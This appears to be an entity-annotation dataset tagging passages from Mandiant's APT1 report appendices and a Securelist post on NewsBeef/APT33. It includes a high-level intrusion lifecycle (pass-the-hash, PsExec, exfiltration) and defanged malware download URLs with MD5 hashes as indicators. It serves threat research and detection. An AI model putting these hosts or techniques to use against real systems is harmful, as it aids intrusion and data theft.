»» Headquarters and other facilities spread 
throughout the Pudong New Area of 
",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"

Infrastructure »» Ready access to four main net blocks in 
",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,", hosted by ",O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report," (one of 
two Tier 1 ISPs in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,")

»» Some use of ",O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report," IP addresses 
(the other Tier 1 ISP)

»» Co-building network infrastructure with 
",O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report," in the name of national 
defense

Combining our direct observations with carefully researched and correlated findings; we believe the facts dictate only 
two possibilities:

either

A secret, resourced organization full of mainland Chinese speakers with direct access to ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,"-based 
telecommunications infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign 
right outside of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s gates, performing tasks similar to ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s known mission.

or

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, is ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,".



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 61 www.mandiant.com

aPPenDIx a:  
how Does ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"  

DIstInGuIsh threat GrouPs?

",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," uses the term threat group to refer to a collection of intruders who are working together to target and 
penetrate networks of interest. These individuals may share the same set of tasks, coordinate their targets, and 
share tools and methodology. They work together to gain access to their targets and steal data. Therefore, a group is 
ultimately defined by people and not by methodology.

However, defining a threat group based on observed intrusion activity is not so simple. Without seeing who is sitting 
behind the keyboard it may be difficult to determine whether two different intrusion events were conducted by the 
same person, by two people who are working together, by two unrelated people who independently compromised the 
same network, or even the same computer. Different groups may use similar intrusion methodology and common tools, 
particularly those that are widely available on the Internet, such as ",O
Mandiant_APT1_Report,pwdump,tool
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report,", or ",O
Mandiant_APT1_Report,Gh0st RAT,malware
Mandiant_APT1_Report,". Furthermore, there 
may be overlaps between groups caused by the sharing of malware or exploits they have authored, or even the sharing 
of personnel. Individual intruders may move between groups either temporarily or permanently. An intruder may be a 
private citizen who is hired by multiple groups. Finally, multiple groups may work together on occasion to compromise 
the same target.

Nevertheless, distinguishing one threat group from another is possible with enough information, analytical experience, 
and the technological tools to piece it all together. Consider an analogy with the physical world: imagine a thief who 
leaves behind traces of his crime at various crime scenes. Individual robberies may vary in many details:

»» The method the thief used to break in;

»» The tools used to open the safe;

»» Whether the thief carefully selected a particular item to steal, or took everything in the hope that he managed to 
grab something of value;

»» Whether the thief carefully researched their target, disabled alarms, and attempted to remove evidence such as 
fingerprints; or whether he was not very careful, but simply relied on being “stealthy enough” to not get caught.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 62 www.mandiant.com

Forensic scientists can analyze multiple crime scenes and be able to tell by the evidence left behind that a given crime 
scene was the result of one thief and not another. 

In a similar way, cyber intruders leave behind various digital “fingerprints.” They may send spear-phishing emails from 
a specific IP address or email address. Their emails may contain certain patterns of subject lines. Their files have 
specific names, MD5 hashes, timestamps, custom functions, and encryption algorithms. Their backdoors may have 
command and control IP addresses or domain names embedded. These are just a few examples of the myriad of 
linkages that computer forensic analysts consider when trying to distinguish one cyber threat group from another.

Digital “fingerprints” do not all carry equal weight in attribution analysis. Their validity or value as indicators of a specific 
threat group depends largely on their likelihood of uniqueness. For example, the use of a widely available tool such as 
",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report," is not unique and not useful — by itself — as an indicator of a specific threat group. In contrast, the use of 
a specific, custom backdoor not observed elsewhere is a much stronger indicator — although it is generally still not 
sufficient, on its own, for positive attribution.

At the most basic level, we say that two intrusion events are attributed to the same group when we have collected 
enough indicators to show beyond a reasonable doubt that the same person or group of people were involved.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 63 www.mandiant.com

aPPenDIx B:  
aPt anD the attaCk LIFeCyCLe

While most computer intrusions follow a generic, high-level series of steps in the attack lifecycle, the Chinese ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," 
lifecycle differs slightly because of their unique long-term objectives. The sections below correspond to the stages 
of ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,’s Attack Lifecycle model and give an overview of what ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," activity looks like in each stage. The stages 
between “Establish Foothold” and “Complete Mission” do not have to occur in this order every time. In fact, once 
established within a network, ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups will continually repeat the cycle of conducting reconnaissance, identifying 
data of interest, moving laterally to access that data, and “completing mission” by stealing the data. This will generally 
continue indefinitely until they are removed entirely from the network. 

Initial Compromise

The Initial Compromise stage represents the methods that intruders use to penetrate a target organization’s network. 
",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," intruders frequently target individual users within a victim environment. As such, the most commonly observed 
method of initial compromise is spear phishing. Spear phishing messages may contain malicious attachments, a link to 
a malicious file, or a link to a malicious website. Less commonly, ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," intruders may attempt to contact potential victims 
and send malicious content via social networking sites or instant messaging. Another common tactic is strategic web 
compromise, in which the attacker places malicious code on websites that people in targeted organizations will likely 
visit. When they visit these websites in the course of their normal duties, they will be compromised if their computer 
is vulnerable to the attacker’s exploit code. ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups may also look for vulnerable Internet-facing web servers and 
upload webshells in order to gain access to a targets internal network, or look for other technical vulnerabilities in 
public-facing infrastructure.

Establish Foothold

Establishing a foothold ensures that ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," threat groups can access and control one or more computers within the 
victim organization from outside the network. ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report, groups can utilize public backdoors (,O
Mandiant_APT1_Report,Gh0st RAT,malware
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Poison Ivy,malware
Mandiant_APT1_Report," are 
common examples), “underground” backdoors found in hacker websites or obtained through personal connections, 
and “custom” backdoors that they developed themselves. These backdoors usually establish an outbound connection 
from the victim network to a computer controlled by the attackers. The communication methods used by the backdoors 
vary from clear text or simple encoding to the use of more advanced encoding or encryption. The backdoors will give 
the ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups basic access to a system, typically through a command shell or graphical user interface.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 64 www.mandiant.com

Escalate Privileges

Escalating privileges involves acquiring items that will allow access to more resources within the victim environment. 
Most often this consists of obtaining usernames and passwords, but it may also include gaining access to PKI 
certificates, VPN client software, privileged computers, or other resources required to access data or systems of 
interest. ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," intruders (and intruders in general) prefer to leverage privileged accounts where possible, such as 
Domain Administrators, service accounts with Domain privileges, local Administrator accounts, and privileged user 
accounts. This is typically accomplished by first “dumping” password hashes from a computer, server, or (preferably) 
Domain Controller. The attacker may be able to obtain legitimate account passwords by “cracking” password hashes. 
Alternately, the attacker may leverage the hashes themselves in a “pass-the-hash” attack, where the hashed password 
itself may be used for authentication in lieu of the actual password. A number of publicly available tools can be readily 
leveraged for both password dumping and pass-the-hash attacks.

Internal Reconnaissance

In the Internal Reconnaissance stage, the intruder collects information about the victim environment. ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," threat 
actors use built-in operating system commands (such as the Windows “net” commands) to obtain information about 
the internal network, including computers, trust relationships, users, and groups. In order to identify data of interest, 
they may perform directory or network share listings, or search for data by file extension, key word, or last modified 
date. Data of interest may take many forms, but most commonly consists of documents, the contents of user email 
accounts, or databases. Therefore file servers, email servers, and domain controllers are customary targets of internal 
reconnaissance. Some ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups utilize custom scripts in order to automate the process of reconnaissance and 
identification of data of interest. 

Move Laterally

In most cases, the systems that the intruders initially compromise do not contain the data that they want. Therefore 
they must move laterally within a network to other computers that either contain that data or allow them to access it. 
",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups leverage compromised user credentials or pass-the-hash tools to gain access to additional computers and 
devices inside of a victim network. They commonly use compromised credentials with PsExec and / or the ",O
Mandiant_APT1_Report,Windows,software
Mandiant_APT1_Report," 
Task Scheduler (“at” command) to execute commands and install malware on remote systems.

Maintain Presence

In this stage, the intruders take actions to ensure continued control over key systems in the network environment from 
outside of the network. ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups often install new backdoors (e.g., different backdoors than the ones installed in the 
Establish Foothold phase) in the environment during the course of the campaign. They may install different families of 
malware on multiple computers and use a variety of command and control addresses, presumably for redundancy and 
to make it difficult to identify and remove all of their access points. Additionally, ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups may establish methods of 
network access that do not involve backdoors, so that they can maintain a presence even if network security personnel 
discover and remove their malware. These methods may include the use of valid PKI or VPN credentials, allowing the 
intruders to masquerade as a legitimate user to gain access to a corporate network and internal resources. In some 
instances ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," threat actors have been able to circumvent two-factor authentication to maintain access to a victim 
network and its resources.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 65 www.mandiant.com

Complete Mission

The main goal of ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," intrusions is to steal data, including intellectual property, business contracts or negotiations, 
policy papers or internal memoranda. Once ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups find files of interest on compromised systems, they often pack 
them into archive files before stealing them. They most commonly use the RAR archiving utility for this task, but may 
also use other publicly available utilities such as ZIP or 7-ZIP. ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," threat actors not only compress data, but frequently 
password-protect the archive. From there they use a variety of methods to transfer files out of the victim network, 
including FTP, custom file transfer tools, or existing backdoors.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 66 www.mandiant.com

aPPenDIx C (DIGItaL): 
the MaLware arsenaL

This appendix is digital and can be found at http://www.mandiant.com/",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". It includes profiles of malware families that 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has used. 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 67 www.mandiant.com

aPPenDIx D (DIGItaL):  
FQDns

This appendix is digital and can be found accompanying this report. It includes fully qualified domain names (FQDNs) 
that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has used as part of their attack infrastructure. 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 68 www.mandiant.com

aPPenDIx e (DIGItaL):  
MD5 hashes

This appendix is digital and can be found at http://www.mandiant.com/",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". It includes MD5 hashes of malware that 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has used as part of their attack methodology.In Appendix G: IOCs, the IOC named ",O
Mandiant_APT1_Report,8dd23e0a-a659-45b4-a168-67e4b00944fb,ioc
Mandiant_APT1_Report,.ioc contains all of the MD5 hashes provided in this appendix for use in conjunction with ,O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report,"™, 
",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"’s free host-based investigative tool, or with ",O
Mandiant_APT1_Report,Mandiant Intelligent Response,software
Mandiant_APT1_Report,® (,O
Mandiant_APT1_Report,MIR,software
Mandiant_APT1_Report,"), ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"’s commercal 
host-based investigative tool.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 69 www.mandiant.com

aPPenDIx F (DIGItaL):  
ssL CertIFICates

This appendix is digital and can be found at http://www.mandiant.com/",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,. It includes ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," SSL certificates used on 
servers that are part of their command and control infrastructure.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 70 www.mandiant.com

aPPenDIx G (DIGItaL):  
IoCs

The portion of this appendix that includes the Indicators of Compromise (IOCs) is digital and can be found at http://
www.mandiant.com/",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". 

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, Indicators and Using ,O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report,"™ 

With the release of ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"’s report, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,: Exposing One of ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s Cyber Espionage Units, we are providing a set of 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," IOCs in the digital portion of Appendix G to help detect malware described in Appendix C: The Malware Arsenal. 
IOCs can be used in investigations to find unknown evils or for detection of already known threats. The IOCs included 
in Appendix G fit the latter; however, keep in mind that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," does update their tools, and there are certainly malware 
variants and new families of malware that will not be detected with this set of IOCs. To find out more about the report or 
the digital appendices (to include downloading the set of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," IOCs in Appendix G: IOCs) go to http://www.mandiant.
com/",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". 

IOCs can be used in conjunction with ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"’s free host-based investigative tool, or with ",O
Mandiant_APT1_Report,Mandiant Intelligent Response,software
Mandiant_APT1_Report,® (,O
Mandiant_APT1_Report,MIR,software
Mandiant_APT1_Report,"), ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,’s commercial host-based investigative tool. ,O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"’s customers who have 
licensed ",O
Mandiant_APT1_Report,MIR,software
Mandiant_APT1_Report, can simply import a zip file of the IOCs into their controllers. For those without ,O
Mandiant_APT1_Report,MIR,software
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report," can be 
downloaded from ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"’s web site at http://www.mandiant.com/resources/download/redline.

Remember to always test new IOCs before using them in a production environment.

What Are IOCs?

",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," has developed an open, extendable standard for defining and sharing threat information in a machine-
readable format. Going well beyond static signature analysis, IOCs combine over 500 types of forensic evidence with 
grouping and logical operators to provide advanced threat detection capability. 

If you are not familiar with IOCs, go to the OpenIOC site for a description at http://openioc.org. 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 71 www.mandiant.com

What Is ",O
Mandiant_APT1_Report,REDLINE,software
Mandiant_APT1_Report,"?

",O
Mandiant_APT1_Report,REDLINE,software
Mandiant_APT1_Report, is ,O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"’s free tool for investigating hosts for signs of malicious activity through memory and file analysis, 
and subsequently developing a threat assessment profile. ",O
Mandiant_APT1_Report,REDLINE,software
Mandiant_APT1_Report," provides several benefits including the following:

RAPID TRIAGE

When confronted with a potentially compromised host, responders must first assess whether the system has active 
malware. Without installing software or disrupting the current state of the host, ",O
Mandiant_APT1_Report,REDLINE,software
Mandiant_APT1_Report," thoroughly audits all currently-
running processes and drivers on the system for a quick analysis; for a detailed analysis, it also collects the entire 
file structure, network state, and system memory. ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report," will also compare any MD5 value it collects, analyzes, and 
visualizes against an MD5 whitelist. Users can further analyze and view imported audit data using ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report,"’s Timeline 
functionality, which includes capabilities to narrow and filter results around a given timeframe with the ",O
Mandiant_APT1_Report,TimeWrinkles,software
Mandiant_APT1_Report,"™ 
and ",O
Mandiant_APT1_Report,TimeCrunches,software
Mandiant_APT1_Report,"™ features. 

REVEALS HIDDEN MALWARE

The ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report," Portable Agent can collect and analyze a complete memory image, working below the level at which 
kernel ",O
Mandiant_APT1_Report,rootkits,technique
Mandiant_APT1_Report," and other malware-hiding techniques operate. Many hiding techniques become extremely obvious when 
examined at the physical memory level, making memory analysis a powerful tool for finding malware. It also reveals 
“memory only” malware that is not present on disk.

GUIDED ANALYSIS

",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,’s ,O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report," tool streamlines memory analysis by providing a proven workflow for analyzing malware based on 
relative priority. This takes the guesswork out of task and time allocation, allowing investigators to provide a focused 
response to the threats that matter most. 

",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report," calculates a “Malware Risk Index” that highlights processes more likely to be worth investigating, and 
encourages users to follow investigative steps that suggest how to start. As users review more audits from clean and 
compromised systems, they build up the experience to recognize malicious activity more quickly.

As you investigate a system, here’s how ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report," will help you focus your attention on the most productive data:

INVESTIGATIVE STEPS

",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report," can collect a daunting amount of raw information. Its investigative steps help provide a starting place by 
highlighting specific data and providing views that are most commonly productive in identifying malicious processes. 
Unless you are pursuing a specific “lead”, we recommend working through the steps in order, examining the 
information for entries that don’t match your expectations.

The key to becoming an effective investigator is to review ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report," data from a variety of “clean” and “compromised” 
systems. Over time, your sense of which entries are normal and which are of concern will develop quickly as you view 
more data.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 72 www.mandiant.com

MALWARE RISK INDEx SCORING

",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report," analyzes each process and memory section using a variety of rules and techniques to calculate a “Malware 
Risk Index” for each process. This score is a helpful guide to identifying those processes that are more likely to be 
worth investigating. Processes at the highest risk of being compromised by malware are highlighted with a red badge. 
Those with some risk factors have a grey badge, and low-risk processes have no badge.

The MRI is not an absolute indication of malware. During an investigation you can refine the MRI scoring by adjusting 
specific hits (identifying false positives and false negatives) for each process, adding your own hits, and generally 
tuning the results.

IOCs

",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report," provides the option of performing IOC analysis in addition to MRI scoring. Supplied a set of IOCs, the ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report," 
Portable Agent will be automatically configured to gather the data required to perform a subsequent IOC analysis; after 
the analysis is run, IOC hit results are available for further investigation.

In addition, ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report," provides the ability to create an IOC Collector. This feature enables the collection of data types 
required for matching a set of IOCs. 

WORKS WITH ",O
Mandiant_APT1_Report,MIR,software
Mandiant_APT1_Report,"

Combined with ",O
Mandiant_APT1_Report,MIR,software
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report," is a powerful tool for accelerated live response. Here’s a typical case:

»» IDS or other system detects suspicious activity on a host

»» From ",O
Mandiant_APT1_Report,MIR,software
Mandiant_APT1_Report,", an investigator launches a remote live response script

»» The ",O
Mandiant_APT1_Report,MIR,software
Mandiant_APT1_Report," Agent running on the host captures and analyzes memory locally, streaming back a small XML audit that 
downloads in minutes rather than hours

»» From ",O
Mandiant_APT1_Report,MIR,software
Mandiant_APT1_Report,", the user can open the audit directly in ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report,"

»» Using ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report,", the investigator quickly identifies a malicious process, and writes an IOC describing the forensic 
attributes found in ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report,"

»» Using ",O
Mandiant_APT1_Report,MIR,software
Mandiant_APT1_Report," and MCIC, the investigator is quickly able to sweep for that IOC and discover all other systems on the 
network with the same (or similar) malware running



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 73 www.mandiant.com

Have ",O
Mandiant_APT1_Report,MIR,software
Mandiant_APT1_Report," Customers had Access to these IOCs Before?

These IOCs are new! However, much of the detection capability in this set of indicators has already been available to 
our ",O
Mandiant_APT1_Report,MIR,software
Mandiant_APT1_Report, customers. The IOCs may look different though as a result of improvements in creation and testing. ,O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," 
started ",O
Mandiant_APT1_Report,2013,timestamp
Mandiant_APT1_Report," with a focus on taking better advantage of our threat intelligence. We plan to continue to improve the 
synthesis of our threat intelligence and our IOCs by improving our breadth, IOC creation process, IOC management 
process, and IOC testing. The majority of these indicators, or modified versions of them, will be integrated into the next 
IOC release.

What Is the FAMILY Designator in This Set of IOCs?

We are using a new IOC designator in these IOCs called “(FAMILY).” ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"’s Threat Intelligence Unit tracks 
malware by common features seen in groups of binaries. We call those groupings of binaries “families.” The IOCs 
included in this appendix are representatives of families of malware used by ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". The new designator follows the 
family name in the “Name” field of the IOC, and the presence of (FAMILY) implies that that IOC applies to the whole 
family, not just one sample.

Why Do These IOCs Look Somewhat Different Than Other IOCs I Have Seen From 
",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"?

In many cases we have combined information that previously would have been in several indicators into a single 
indicator. Additionally, we have removed certain types of intelligence, since they are being released in separate 
appendices (such as FQDNs and IPs).

Additionally, some IOCs in this set are using file permutation blocks to catch variants of malware that might not be 
detected otherwise.

What Is a File Permutation block? 

It is a different way to structure lists of File Item attributes to look for an entire family of malware versus only one or two 
pieces. For more information on this topic or most any other IOC questions go to https://forums.mandiant.com.

Will You Update These IOCs?

It is likely that we will make some changes to the IOCs in Appendix G as we get feedback. If updated, the updates will 
be available in the same location as the report http://www.mandiant.com/",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,".

Will You Be Releasing More IOCs Like This?

Currently, there are no plans for additional public releases of this magnitude. 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 74 www.mandiant.com

aPPenDIx h (DIGItaL):  
vIDeo

This appendix is digital and can be found at http://www.mandiant.com/",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". It includes a compilation of videos showing 
actual attacker sessions and their intrusion activities. 


	
	Executive Summary
	",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,’s Computer Network Operations Tasking to ,O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report," (61398部队)
	",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": Years of Espionage 
	",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": Attack Lifecycle
	",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": Infrastructure
	",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": Identities
	Conclusion
	Appendix A: 
How Does ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," 
Distinguish Threat Groups?
	Appendix B: 
APT and the Attack Lifecycle
	Appendix C (Digital):
The Malware Arsenal
	Appendix D (Digital): 
FQDNs
	Appendix E (Digital): 
MD5 Hashes
	Appendix F (Digital): 
SSL Certificates
	Appendix G (Digital): 
IOCs
	Appendix H (Digital): 
Video",O
Twas the night before,7/5/2019,timestamp
Twas the night before, ‘Twas ,O
Twas the night before,the night before,timestamp
Twas the night before," | Securelist

https://securelist.com/twas-the-night-before/91599/ 1/13

By GReAT

‘Twas ",O
Twas the night before,the night before,timestamp
Twas the night before,"
securelist.com/twas-the-night-before/91599

Recently, the ",O
Twas the night before,United States,country
Twas the night before, Cyber Command (,O
Twas the night before,USCYBERCOM,org
Twas the night before," Malware Alert
@CNMF_VirusAlert) highlighted several ",O
Twas the night before,VirusTotal,software
Twas the night before," uploads of theirs – and the
executable objects relating to ",O
Twas the night before,2016 – 2017,timestamp
Twas the night before, ,O
Twas the night before,NewsBeef/APT33,threat_actor
Twas the night before," activity are interesting for a
variety of reasons. Before continuing, it’s important to restate yet again that we defend
customers, and research malware and intrusions, regardless of their source.
Accordingly, subscribers to our private ",O
Twas the night before,APT,threat_actor
Twas the night before," intelligence reports receive unique and
extraordinary data on the significant activity and campaigns of over 100 ",O
Twas the night before,APT,threat_actor
Twas the night before,"s from all
over the world, including this ",O
Twas the night before,2016-2017,timestamp
Twas the night before, ,O
Twas the night before,NewsBeef /APT33,threat_actor
Twas the night before," activity.

",O
Twas the night before,USCYBERCOM,org
Twas the night before,’s ,O
Twas the night before,VirusTotal,software
Twas the night before, executable object uploads appeared in our ,O
Twas the night before,January 2017,timestamp
Twas the night before,"
private report “",O
Twas the night before,NewsBeef,threat_actor
Twas the night before," Delivers Christmas Presence”, an examination of a change in
the tactics used in ",O
Twas the night before,spear-phishing,technique
Twas the night before, and ,O
Twas the night before,watering hole attacks,technique
Twas the night before," against Saudi Arabian
targets. Two files uploaded by ",O
Twas the night before,USCYBERCOM,org
Twas the night before," are of particular interest. These were first
seen ",O
Twas the night before,Dec 2016,timestamp
Twas the night before, and ,O
Twas the night before,Jan 2017,timestamp
Twas the night before,":

MD5: ",O
Twas the night before,d87663ce6a9fc0e8bc8180937b3566b9,ioc
Twas the night before,", served as
",O
Twas the night before,jquerycode-download[.]live/flashplayer23pp_xa_install.exe,ioc
Twas the night before,"
",O
Twas the night before,jquerycode-download[.]live/chrome_update.exe,ioc
Twas the night before,"
Detected as BSS:",O
Twas the night before,Exploit.Win32.Generic,malware
Twas the night before,", ",O
Twas the night before,Trojan-Downloader.Win32.Powdr.a,malware
Twas the night before,", ",O
Twas the night before,Trojan-Downloader.MSIL.Steamilik.zzo,malware
Twas the night before,"

MD5: ",O
Twas the night before,9b1a06590b091d300781d8fbee180e75,ioc
Twas the night before,", served as
",O
Twas the night before,jquerycode-download[.]live/citrixreceiver.exe,ioc
Twas the night before,"
",O
Twas the night before,jquerycode-download[.]live/citrixcertificate.exe,ioc
Twas the night before,"
",O
Twas the night before,ntg-sa[.]com/downloads/citrix_certificate.exe,ioc
Twas the night before,"
Detected as BSS:",O
Twas the night before,Exploit.Win32.Generic,malware
Twas the night before,", ",O
Twas the night before,Trojan-Downloader.PowerShell.Agent.ah,malware
Twas the night before,",
",O
Twas the night before,DangerousObject.Multi.Generic,malware
Twas the night before,"

In order to share insight into Cyber Command’s highlighted malware and its context,
some of our private report’s content will be re-written here. The ",O
Twas the night before,January 2017,timestamp
Twas the night before," report
followed up on other private reports published on the group’s ",O
Twas the night before,BeEF,technique
Twas the night before,"-related activity in
",O
Twas the night before,2015,timestamp
Twas the night before, and ,O
Twas the night before,2016,timestamp
Twas the night before,. All of them cover a thread of ,O
Twas the night before,mid-2015,timestamp
Twas the night before, activity continuing into ,O
Twas the night before,2016,timestamp
Twas the night before,", then
resetting and advancing in ",O
Twas the night before,2016,timestamp
Twas the night before, and into ,O
Twas the night before,2017,timestamp
Twas the night before,". Bear in mind that regardless of current
leaks, which do not always present exhaustive information on group participants, activity
from the region has had multiple overlaps and presents a confusion of internal
dynamics…

",O
Twas the night before,NewsBeef,threat_actor
Twas the night before," Delivers Christmas Presence
Examination of a change in tactics used in ",O
Twas the night before,spearphishing,technique
Twas the night before, and ,O
Twas the night before,watering hole attacks,technique
Twas the night before,"
against Saudi Arabian targets

https://securelist.com/twas-the-night-before/91599/
https://twitter.com/CNMF_VirusAlert
